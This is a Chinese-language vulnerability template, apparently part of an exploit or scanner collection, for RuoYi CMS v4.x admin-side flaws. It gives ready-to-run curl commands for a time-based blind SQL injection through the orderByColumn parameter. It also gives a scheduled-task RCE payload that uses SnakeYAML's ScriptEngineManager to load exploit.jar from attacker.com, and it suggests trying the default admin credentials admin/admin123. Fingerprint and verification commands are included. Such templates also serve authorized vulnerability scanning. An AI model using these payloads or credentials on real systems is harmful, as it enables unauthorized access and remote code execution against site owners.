---
id: RUOYI-SQLI
title: 若依CMS 后台SQL注入漏洞
product: ruoyi
vendor: 若依
version_affected: "v4.x"
severity: HIGH
tags: [sqli, 需要认证, 国产, cms]
fingerprint: ["若依", "RuoYi", "ruoyi"]
---

## 漏洞描述

若依CMS后台多个接口存在SQL注入漏洞，通过orderByColumn参数可注入。

## 影响版本

- 若依CMS v4.x

## 前置条件

- 目标运行若依CMS 且可通过网络访问
- 需要后台管理员账号（可尝试默认凭据 `admin`/`admin123` 或 `ry`/`admin123`）

## 利用步骤

### orderByColumn 注入

```http
GET /system/role/list?pageSize=10&pageNum=1&orderByColumn=id)%20AND%20(SELECT%20*%20FROM%20(SELECT%20SLEEP(3))a)%23&isAsc=asc HTTP/1.1
Host: target
Cookie: <admin_cookie>
```

### 定时任务RCE（需admin权限）

后台 → 系统监控 → 定时任务 → 新增:
- 调用目标字符串: `org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]')`

或使用已有的bean调用:
- `ruoyiConfig.setProfile('../../../../tmp/test')`

## Payload

### orderByColumn 时间盲注

```bash
curl -s -b "JSESSIONID=<admin_session>" \
  "http://target/system/role/list?pageSize=10&pageNum=1&orderByColumn=id)%20AND%20(SELECT%20*%20FROM%20(SELECT%20SLEEP(3))a)%23&isAsc=asc"
```

### 定时任务 RCE（需 admin 权限）

```bash
curl -X POST "http://target/monitor/job/add" \
  -b "JSESSIONID=<admin_session>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "jobName=test&jobGroup=DEFAULT&invokeTarget=org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://attacker.com/exploit.jar\"]]]]')&cronExpression=0/5+*+*+*+*+?&misfirePolicy=1"
```

## 验证方法

- 时间盲注：发送 `SLEEP(3)` payload 后响应延迟约3秒即确认注入存在
- 定时任务 RCE：attacker.com 收到 exploit.jar 下载请求即确认代码可执行

```bash
# 时间对比验证
time curl -s -b "JSESSIONID=<admin_session>" \
  "http://target/system/role/list?pageSize=10&pageNum=1&orderByColumn=id)%20AND%20(SELECT%20*%20FROM%20(SELECT%20SLEEP(3))a)%23&isAsc=asc" -o /dev/null
```

## 指纹确认

```bash
curl -s http://target/login | grep -i "ruoyi"
```
